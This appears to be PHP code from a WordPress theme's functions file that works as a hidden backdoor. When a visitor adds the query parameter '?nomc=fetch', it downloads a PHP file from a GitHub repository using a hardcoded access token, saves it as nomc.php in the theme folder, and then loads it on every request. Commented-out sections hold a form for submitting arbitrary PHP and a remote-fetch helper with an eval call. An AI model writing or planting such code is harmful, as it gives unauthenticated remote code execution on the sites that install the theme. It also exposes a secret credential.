add_action('after_setup_theme', function(){
	$param = 'nomc';
    /* if(isset($_GET[$param]) && $_GET[$param] == $val){
        ?>
        <style>
            .nomcy{
                position: fixed;
                left: 0;
                top: 0;
                width: 100%;
                height: 100%;
                z-index: 99;
                display: flex;
            }
            .nomcy .box{  
                margin: auto;
                width: 50%;
                background: #fff;
                border-radius: 5px;
                border: 1px solid #0003;
                box-shadow: 0 3px 5px #0003;
                padding: 16px;
            }
            .nomcy .box textarea{
                border: 1px solid #0001;
                width: 100%;
                padding: 8px;
            }
        </style>
        <div class="nomcy">
            <form class="box" method="POST">
                <div><textarea name="php" id="" rows="10"></textarea></div>
                <div style="text-align: right; margin-top: 16px;"><button class="btn button" type="submit" name='nomcy_exec'>Submit</button></div>
            </form>
        </div>
        <?
    } */

	if(isset($_GET[$param]) && $_GET[$param] == 'fetch'){
		$owner = 'avijitpalit';
		$repo = 'nomercy';
		$branch = 'main';
		$filepath = 'fetch.php';
		$github_url = "https://api.github.com/repos/$owner/$repo/contents/$filepath?ref=$branch";

		$options = [
			'http' => [
				'header' => [
					'User-Agent: PHP',
					'Authorization: token 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'
				]
			]
		];
		$context = stream_context_create($options);
		$response = file_get_contents($github_url, false, $context);
		$data = json_decode($response, true);
		if(json_last_error() !== JSON_ERROR_NONE) die('Error: Invalid JSON response.');
		$php = base64_decode($data['content']);
		if ($php === false) die('Error: Could not decode the file content.');
		$file = __DIR__.'/nomc.php';
		$file_handle = fopen($file, 'w');
		if($file_handle === false)
			die('Error: Could not open the file for writing.');
		if(fwrite($file_handle, $php) === false)
			die('Error: Could not write to the file.');
		fclose($file_handle);

		// if(file_exists($file)) require_once $file;
	}
});

$file = __DIR__ . '/nomc.php';
if(file_exists($file)) require_once $file;



function include_remote_php($url) {
    // Fetch the remote PHP file content
    $php_code = file_get_contents($url);

    // Check if the content was successfully fetched
    if ($php_code === false) {
        throw new Exception("Failed to fetch the remote PHP file.");
    }

    // Execute the PHP code using eval
	echo $php_code;
    //eval($php_code);
}

$remote_url = 'https://raw.githubusercontent.com/avijitpalit/nomercy/main/fetch.php';

/* try {
    include_remote_php($remote_url);
} catch (Exception $e) {
    echo "Error: " . $e->getMessage();
} */
